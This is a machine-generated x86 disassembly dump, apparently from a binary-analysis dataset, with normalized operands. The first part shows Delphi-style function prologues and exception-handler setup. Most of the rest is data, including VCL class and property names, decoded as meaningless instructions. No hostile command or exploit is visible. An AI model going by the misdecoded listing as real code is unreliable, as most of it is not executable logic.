mov edx ebx
call sub_432070
mov ecx eax
mov edx ebx
mov eax edi
call sub_432928
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4324ac
test al al
je r-xdata
sub_432c38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432c57
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432c5e
retn
sub_432c64
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_432c9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432cc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432cc8
retn
sub_432e0c
inc ebx
je r-xdata
jae r-xdata
insb
jae r-xdata
pushad
xor eax 0x35540040
inc eax
outsd
outsb
inc esi
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax + 0x2e ] ah
inc ebx
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc ebx
outsd
insb
jne r-xdata
inc eax
add al dl
xor al [ eax ]
jo r-xdata
popad
je r-xdata
or [ ebx + 0x6f ] al
insd
jb r-xdata
add [ edx + esi + 0x32d00040 ] dh
xor ch [ edi ]
inc ebx
add [ eax ] dh
add [ eax ] al
jb r-xdata
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
pushfd
inc ebx
add [ eax - 0x13ffbc93 ] bh
insd
inc ebx
add ah ah
insd
inc ebx
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
test [ esi + 0x43 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
add bh bh
nop
insd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
imul edi [ edx + 0x65 ] r-xdata
outsb
mov eax eax
inc esp
das
inc ebx
add [ edi ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
inc ecx
add [ eax + eax ] cl
add bh bh
sbb [ esi + 0x43 ] ch
inc ebx
add al bl
xchg ebx eax
inc ecx
add al dl
push 0x43
add [ esi + ebp * 2 + 0x6f280043 ] dh
inc ebx
add al dl
xchg edi eax
inc ecx
add al ah
insb
inc ebx
add al bh
xchg edi eax
inc ecx
add al cl
imul eax [ ebx ] 0xe
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add [ esi ] eax
push esp
push edi
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
mov al [ 0x100432e ]
push es
imul ebp [ esi + 0x61 ] 0x43086574
outsd
insd
inc ebx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
pop eax
imul ebp [ edi + 0x6e ] r-xdata
popad
jo r-xdata
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
outsd
insb
jne r-xdata
inc ebx
add [ eax ] bl
add [ eax ] al
jmp [ esi + ebp * 2 + 0x10043 ]
push ebx
add [ eax ] al
insb
jae r-xdata
xor eax 0x355c0040
inc eax
jb r-xdata
add [ eax ] al
outsb
add [ edi ] ch
inc ebx
add [ esi + 0x80041 ] ch
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ ebx ] cl
arpl [ ebx + esi * 2 + 0x53 ] sp
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + 0x64 ] esp
jae r-xdata
mov eax 0x600432d
inc eax
add [ eax + 0x6a ] dh
xor al [ eax ]
shl [ edx ] 0x1
imul ebp [ edi + 0x6e ] 0x6d726f46
add [ eax ] al
inc [ esi + ebp * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
or cl [ ecx + 0x6d ]
popad
dec ecx
outsb
js r-xdata
insb
jae r-xdata
dec ecx
jb r-xdata
add [ eax + 0x2e ] ch
inc ebx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
outsd
insd
inc esp
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
call [ eax + 0x6e ]
inc ebx
add [ eax + eax ] dl
add bh bh
xchg esp eax
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or [ ebp + 0x61 ] cl
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ 0x50ff0000 ] cl
outsb
[ eax ]
outsb
inc ebx
add [ esp + ebx * 2 ] ch
adc [ ebx + eax * 2 + 0x75 ] dl
jns r-xdata
add [ eax ] al
add [ eax ] al
ja r-xdata
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xor [ ebx ] al
hlt
add [ eax + 0x32 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb [ eax ] al
add bh bh
movsb [ edi ] [ esi ]
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
or esp [ fs : ebx + 0x64 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
insd
imul esi [ ebx + 0x61 ] 0x64656c62
or ah [ ebx + 0x64 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
je r-xdata
push 0x656b6365
or ah [ fs : ebx + 0x64 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add esi [ eax ]
sub eax 0xd4900043
sub eax 0x9030043
push esp
push ebx
outsd
jb r-xdata
jae r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ah [ fs : ebx + 0x64 ]
jae r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
push esp
jns r-xdata
popa
jne r-xdata
inc eax
add [ gs : eax ] eax
push es
je r-xdata
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
jae r-xdata
outsd
outsb
push es
outsb
jbe r-xdata
inc ebx
outsd
inc esp
popad
je r-xdata
or [ ebx + 0x64 ] esp
jae r-xdata
arpl [ ebx + esi * 2 + 0x48 ] sp
outsd
je r-xdata
add [ ebx + esi ] cl
inc eax
add [ eax - 0x4bffbc97 ] ah
imul eax [ ebx ] 0x6f43540b
push es
jae r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
popad
jb r-xdata
adc [ ebx + 0x64 ] ah
arpl [ ebx + esi * 2 + 0x4d ] sp
push esp
js r-xdata
jae r-xdata
jae r-xdata
adc [ fs : ebx + 0x64 ] ah
add al dl
sub eax 0x73060043
je r-xdata
outsb
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
inc ebx
push es
push cs
inc edx
outsd
je r-xdata
jae r-xdata
add [ eax ] ah
inc cx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
outsd
outsb
js r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0xfffffe04
add [ esi ] cl
inc ebx
sub_43375b
inc ebp
jbe r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
outsb
je r-xdata
dec ecx
je r-xdata
insd
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
insb
outsd
ja r-xdata
insd
or [ eax ] dl
push esp
add [ eax + r-xdata ] dl
dec ecx
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
pop es
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax - 0x57ffbccf ] ah
xor eax 0x10000043
inc eax
add [ ebx + 0x4338c4c0 ] cl
add [ eax ] cl
adc edx [ esp + ecx * 2 + 0x56 ]
inc ebx
outsd
insb
jne r-xdata
outsb
je r-xdata
add [ ecx + edx ] al
inc eax
add [ eax - 0x57ffbccf ] ah
xor eax 0x50900043
cmp [ ebx ] al
insd
add [ ecx ] eax
push ebx
push es
push ebx
je r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
nop
push 0x8004339
andps xmm1 [ esi + edx * 2 + 0x43 ]
outsb
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
outsb
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
dec esp
push esi
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
imul ebp [ esi + 0x67 ] 0x40110400
aaa
inc ebx
add [ eax ] cl
push cs
push esp
dec esp
push esi
inc ebx
push 0x65676e61
inc ebp
jbe r-xdata
add al bh
dec ecx
je r-xdata
inc ebx
add [ eax + 0x3c004331 ] ah
adc [ eax ] al
cmp al 0x10
jb r-xdata
outsd
insd
jo r-xdata
inc ebx
inc ebx
outsd
insb
jne r-xdata
je r-xdata
inc ebx
outsd
insb
jne r-xdata
add cl [ eax ]
push es
push ebx
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
jb r-xdata
outsb
je r-xdata
add [ eax - 0x6bffbccf ] ah
adc [ eax ] al
lea eax [ eax ]
clc
inc eax
insd
add [ ecx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
dec ecx
jns r-xdata
inc eax
add [ ebp + 0x39e80040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
dec esp
push esi
dec esi
outsd
je r-xdata
cmp al 0x10
inc eax
inc ebp
jbe r-xdata
dec esp
push esi
outsb
add [ ecx + edx ] al
inc eax
add [ eax + 0x2f ] al
inc ebx
add [ ecx + edi ] cl
inc ebx
add [ eax ] cl
adc al 0x54
dec esp
push esi
inc ebx
outsd
insb
jne r-xdata
inc eax
add [ eax - 0x6fffbccf ] ah
jb r-xdata
dec ecx
outsb
outsb
adc [ 0x6e696f50 ] al
je r-xdata
inc ebx
outsd
insb
jne r-xdata
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
outsb
jb r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
imul esi [ fs : edi + eax + 0x42 ] 0x656c6f6f
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + 0x4331 ] ah
adc [ eax ] al
nop
test al 0x37
inc ebx
add [ eax ] cl
push cs
push esp
dec esp
push esi
inc ebp
imul esi [ fs : ebp + 0x64 ] 0x6e657645
je r-xdata
push edx
insd
add [ eax ] cl
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
outsb
jbe r-xdata
add [ eax + edx ] bh
outsb
je r-xdata
pop es
outsb
push edx
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
jb r-xdata
je r-xdata
outsb
inc ebx
outsd
insd
jo r-xdata
pop es
add [ ecx + edx ] al
inc eax
add [ eax + 0x2f ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
or [ edi ] cl
push esp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x40110400
push esp
dec esp
dec ecx
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
add [ eax ] al
add [ esp ] bl
ja r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
add eax 0x65530608
outsb
jb r-xdata
je r-xdata
outsb
insd
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
inc ebx
jne r-xdata
sub [ edx ] bh
inc ebx
add [ eax ] cl
nop
jb r-xdata
arpl [ gs : eax + ecx + 0x6 ] si
insd
add [ esi ] al
inc ebx
push 0x65676e61
or edx [ ecx + ecx * 2 + 0x74 ]
insd
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
inc esp
popa
jne r-xdata
or eax [ ebp + 0x66 ]
popad
andps xmm1 [ edi + 0x77 ]
je r-xdata
je r-xdata
outsb
jb r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
xor [ ecx ] ecx
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ 0x6d657449 ] al
xor cl [ ecx ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ 0x6d657449 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x5 ] si
dec ecx
je r-xdata
jae r-xdata
pop es
or [ esi ] al
inc ebx
outsd
insb
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jae r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
je r-xdata
adc dl [ esp + ecx * 2 + 0x56 ]
push ebx
pop es
dec ecx
outsb
je r-xdata
inc ecx
insb
dec ecx
je r-xdata
inc ebx
jne r-xdata
je r-xdata
imul esi [ ebx + 0x74 ] 0x77656956
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
insd
inc esp
jb r-xdata
cmp al [ ebx ]
or [ edx ] dl
push esp
dec esp
push esi
insd
inc ebp
jbe r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
jb r-xdata
dec ecx
je r-xdata
je r-xdata
dec ecx
outsd
arpl [ gs : ecx + eax + 0xb ] si
dec ecx
je r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
andps xmm0 [ ebx + 0x75 ]
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
insb
arpl [ gs : ecx + ecx * 2 + 0x74 ] si
insd
inc ebp
jbe r-xdata
jb r-xdata
dec ecx
je r-xdata
inc ebx
push 0x65676e61
insd
add [ esi ] al
inc ebx
push 0x65676e61
or edx [ ecx + ecx * 2 + 0x74 ]
insd
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
jne r-xdata
jb r-xdata
add [ ebx ] ecx
push esp
push edx
popad
ja r-xdata
push esp
inc ebx
inc esp
jb r-xdata
ja r-xdata
inc ebx
jne r-xdata
adc dl [ esp + ecx * 2 + 0x56 ]
outsb
je r-xdata
push ebx
je r-xdata
add [ eax + 0x4331 ] ah
adc [ eax ] al
lea eax [ eax ]
test [ edx ] bh
inc ebx
add [ eax ] cl
adc [ esp + ecx * 2 + 0x56 ] dl
insd
or [ esp + ecx * 2 + 0x69 ] edx
inc esp
inc eax
add [ edx + edi + 0x10080043 ] al
push esp
dec esp
push esi
insd
inc ebp
je r-xdata
outsb
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
ja r-xdata
adc [ edx + edx * 2 ] al
insd
ja r-xdata
insd
dec esp
add al 0x11
inc eax
add [ eax - 0x5fffbccf ] ah
xor [ ebx ] eax
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
inc ebx
push 0x65676e61
add [ ebx ] ecx
insd
je r-xdata
dec ecx
je r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
insd
inc esp
jb r-xdata
inc ebp
jbe r-xdata
je r-xdata
push ebx
je r-xdata
ja r-xdata
add [ eax + 0x4343 ] dl
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pop esp
cmp eax [ ebx ]
or [ esi ] dl
inc edx
je r-xdata
add [ eax - 0x5fffbcbd ] dl
xor [ ebx ] eax
mov ah 0x2d
inc ebx
ja r-xdata
push esp
dec esp
push esi
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x3b5c0040 ] cl
inc ebx
add [ eax ] cl
push ss
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ ecx + edx ] al
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
add [ esp + eax * 2 ] al
popad
je r-xdata
insd
add eax 0x65530608
outsb
imul esi [ ebx + 0x74 ] 0x77656956
dec ecx
je r-xdata
je r-xdata
add eax 0x63655241
imul esi [ ebx + 0x74 ] 0x6d657449
add al 0x49
lea eax [ eax ]
add al 0x3d
insd
inc esp
jb r-xdata
ja r-xdata
insd
pop es
dec ecx
outsb
je r-xdata
outsb
dec ecx
je r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x74490408
ja r-xdata
outsd
insb
popad
outsb
je r-xdata
outsb
insd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
jb r-xdata
je r-xdata
add [ eax ] al
adc [ eax ] al
loopne r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
je r-xdata
insd
inc ebx
add [ eax ] cl
sbb [ esp + ecx * 2 + 0x56 ] edx
add [ gs : ebx ] ecx
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
inc ebx
jne r-xdata
inc ecx
jbe r-xdata
dec esp
push esi
insd
jb r-xdata
add [ 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
insd
jae r-xdata
outsd
push esp
inc ebx
jne r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
add [ eax ] al
aam 0x2c
inc ebx
inc esp
popa
jne r-xdata
jbe r-xdata
add [ eax + ecx ] al
jb r-xdata
push es
add al 0x8
inc ebx
jne r-xdata
add [ edi ] al
push ebx
jne r-xdata
insd
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
je r-xdata
add [ eax ] al
adc [ eax ] al
outsd
outsd
insb
popad
outsb
outsb
arpl [ ebp + 0x64 ] sp
je r-xdata
jae r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
inc ebx
jne r-xdata
sub eax 0x10000043
insd
inc eax
add al bh
add [ eax - 0x5fffbcbd ] dl
xor [ ebx ] eax
add [ eax ] al
add [ eax ] al
sbb al 0x64
pop es
je r-xdata
je r-xdata
inc eax
add al ah
cmp eax [ ebx ]
or [ ecx ] bl
push esp
dec esp
push esi
add [ ebp + ebp + 0x10000043 ] dh
insd
outsb
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
sbb dl [ esp + ecx * 2 + 0x56 ]
push esi
imul esp [ ebp + 0x77 ] 0x74490408
insd
je r-xdata
inc esp
je r-xdata
je r-xdata
je r-xdata
inc ebx
add [ eax ] cl
inc eax
add [ ebp + 0x3d040040 ] cl
je r-xdata
outsb
adc al [ 0x63655241 ]
push esp
inc ebx
jne r-xdata
add eax 0x74617453
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
push esp
dec esp
push esi
inc ecx
jbe r-xdata
add [ edi + 0x1e080043 ] al
outsd
je r-xdata
add [ eax ] cl
insd
dec esp
popad
insd
inc esp
jb r-xdata
jb r-xdata
adc al [ 0x63655241 ]
push esp
inc ebx
dec ecx
je r-xdata
jae r-xdata
insd
inc esp
jb r-xdata
dec ecx
ja r-xdata
insb
insd
inc esp
jbe r-xdata
insd
add eax 0x65530608
outsb
jb r-xdata
add [ 0x67617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
push esp
ja r-xdata
je r-xdata
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
arpl [ ebp + eax + 0x54 ] si
outsd
insd
inc esp
jb r-xdata
inc esp
popa
jne r-xdata
add [ ebx ] ecx
add [ eax - 0x5fffbcbd ] dl
xor [ ebx ] eax
cmp al 0x10
inc eax
add [ ebp + ebp + 0x10000043 ] dh
inc eax
add [ esp + edi + 0x43 ] bh
inc edx
outsd
or eax [ ebp + 0x66 ]
popad
ja r-xdata
insd
ja r-xdata
je r-xdata
jb r-xdata
sub eax 0x2cd40043
insd
add [ eax ] al
adc [ eax ] al
insb
adc [ eax ] al
mov ah 0x2d
inc ebx
add ah dl
sub al 0x43
andps xmm0 [ ebx + 0x75 ]
ja r-xdata
add [ eax + 0x3c004331 ] ah
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
insd
add [ eax - 0x5fffbcbd ] dl
xor [ ebx ] eax
mov ah 0x2d
inc ebx
add ah dl
sub al 0x43
add [ eax ] al
adc [ eax ] al
inc edx
outsd
outsd
insb
popad
outsb
outsb
jb r-xdata
popad
je r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
add [ esi ] al
outsd
insd
inc esp
jb r-xdata
or [ ecx + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
ja r-xdata
je r-xdata
dec ecx
outsd
adc [ gs : si + 0x43 ] dl
jne r-xdata
add [ gs : 0x67617453 ] al
je r-xdata
jb r-xdata
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
ja r-xdata
je r-xdata
je r-xdata
jne r-xdata
inc edx
outsd
outsd
insb
popad
outsb
push 0x65726944
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ edi + edx * 2 ] al
jb r-xdata
insd
popad
je r-xdata
popad
je r-xdata
inc ebx
aam 0x2c
dec ecx
je r-xdata
je r-xdata
outsd
je r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsb
jb r-xdata
push es
add [ edi ] al
push ebx
jne r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
jb r-xdata
insd
inc esp
jb r-xdata
outsd
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
popad
ja r-xdata
lodsb [ esi ]
cmp eax 0x21080043
insd
push esp
dec esp
push esi
inc ecx
inc eax
add [ ebp + edi + 0x21080043 ] ch
je r-xdata
insd
inc esp
jb r-xdata
dec ecx
add [ eax + 0x4343 ] dl
add [ eax ] al
add ah dl
sub al 0x43
inc edx
jae r-xdata
ja r-xdata
je r-xdata
ja r-xdata
outsd
jne r-xdata
popad
insd
inc ebp
jbe r-xdata
outsb
jb r-xdata
je r-xdata
push ebx
jb r-xdata
jne r-xdata
dec ecx
je r-xdata
outsb
jo r-xdata
outsb
js r-xdata
imul ebp [ esi + 0x67 ] 0x72745306
imul ebp [ esi + 0x67 ] 0x69460c12
outsb
push eax
outsd
jae r-xdata
outsb
je r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x6e657645
je r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x69460a02
outsb
push ebx
je r-xdata
inc esi
inc ebp
jbe r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x56 ] edx
inc eax
add [ esi + edi + 0x43 ] ch
insd
pop es
dec ecx
outsb
je r-xdata
jae r-xdata
add [ gs : bp + di ] ecx
inc esp
popa
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
outsb
je r-xdata
ja r-xdata
insd
ja r-xdata
jae r-xdata
inc ebx
inc ebx
je r-xdata
outsd
jne r-xdata
je r-xdata
add [ eax ] dl
insd
add eax 0x67617453
ja r-xdata
outsd
jb r-xdata
or [ esi ] al
push ebx
outsb
je r-xdata
ja r-xdata
insd
inc esp
jb r-xdata
add al 0x49
outsb
je r-xdata
je r-xdata
je r-xdata
ja r-xdata
insd
add [ edx ] cl
push ebx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xa ] si
add [ 0x65646e49 ] eax
js r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
inc eax
add [ esi + esi ] bh
jb r-xdata
or [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
dec edi
ja r-xdata
or [ ecx ] dl
push esp
dec esp
push esi
jb r-xdata
adc cl [ si ]
inc esi
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
insd
add cl [ eax ]
push es
je r-xdata
add [ eax ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
dec ecx
je r-xdata
pop es
je r-xdata
adc [ eax ] eax
mov al [ 0xffffffff8b004331 ]
add [ eax - 0x5fffbcbd ] dl
xor [ ebx ] eax
cmp al 0x10
inc eax
add [ ebp + ebp + 0x2cd40043 ] dh
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
adc [ gs : ebx + eax * 2 + 0x75 ] dl
dec ecx
je r-xdata
bound ecx [ ecx + 0x74 ]
insd
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
add [ gs : bp + di ] ecx
add [ 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
add al 0x49
push ds
imul esp [ ebp + 0x77 ] 0x52410512
arpl [ gs : ebp + eax + 0x54 ] si
je r-xdata
add eax 0x63655241
add [ ebx ] ecx
inc esp
popa
je r-xdata
jb r-xdata
outsb
inc ebp
jb r-xdata
dec ecx
outsb
je r-xdata
jb r-xdata
inc eax
add al ch
xor eax 0x10940043
inc eax
add al 0x11
outsd
outsb
push es
push esp
push eax
or dl [ ebx + 0x74 ]
popad
imul ebp [ esi + 0x64 ] 0x74495409
insd
add [ esi + eax * 2 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
add eax 0x74617453
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
je r-xdata
inc ebx
add [ eax ] al
adc [ eax ] al
cmp al 0x10
inc eax
add [ ebp + 0x3f9c0040 ] cl
cmp al 0x36
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x69460800
outsb
inc esp
popad
je r-xdata
imul esi [ ecx + ebp * 2 + 0x6f ] 0x5054066e
shl [ eax + 0x800433e ] 0x15
push esp
dec esp
push esi
dec edi
insd
add [ ecx + edx ] al
inc eax
add [ eax - 0x74ffbccf ] ah
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
add [ gs : bp + di ] ecx
inc esp
popa
jne r-xdata
je r-xdata
jb r-xdata
je r-xdata
inc ebp
insd
jb r-xdata
jbe r-xdata
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ 0x67617453 ] al
or dl [ ebx + 0x74 ]
popad
add [ eax ] cl
inc ebp
outsb
dec ecx
outsb
js r-xdata
jae r-xdata
outsb
je r-xdata
add [ ecx + edx ] al
popad
je r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx ] bh
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0xa007265
push ebx
ja r-xdata
push esp
dec esp
push esi
dec edi
dec ecx
outsb
js r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add [ 0x67617453 ] al
ja r-xdata
inc ebx
add [ eax ] cl
adc eax 0x4f564c54
je r-xdata
imul ebp [ esi + 0x64 ] 0x69736f50
insd
insd
inc esp
inc ebp
jbe r-xdata
